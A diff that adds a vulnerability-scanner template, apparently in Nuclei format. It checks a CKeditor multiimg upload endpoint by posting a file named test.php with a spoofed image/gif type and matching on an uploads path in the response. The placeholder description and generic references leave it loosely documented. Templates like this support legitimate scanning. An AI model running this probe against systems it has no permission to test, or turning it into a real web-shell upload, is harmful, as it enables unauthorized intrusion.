@@ -1,0 +1,43 @@
+id: shiziyu-ckeditor-upload
+
+info:
+  name: shiziyu-ckeditor-upload
+  author: sasaa
+  severity: high
+  description: write your description here
+  reference:
+  - https://github.com/
+  - https://cve.mitre.org/
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
+    Content-Length: 186
+
+    ------WebKitFormBoundary8UaANmWAgM4BqBSs
+    Content-Disposition: form-data; name="files"; filename="test.php"
+    Content-Type: image/gif
+
+    123
+
+    ------WebKitFormBoundary8UaANmWAgM4BqBSs—
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200
+    - contains(body,'image/uploads/')
+    condition: and
+
+
+# Generated From WebFuzzer on 2023-12-06 09:41:18
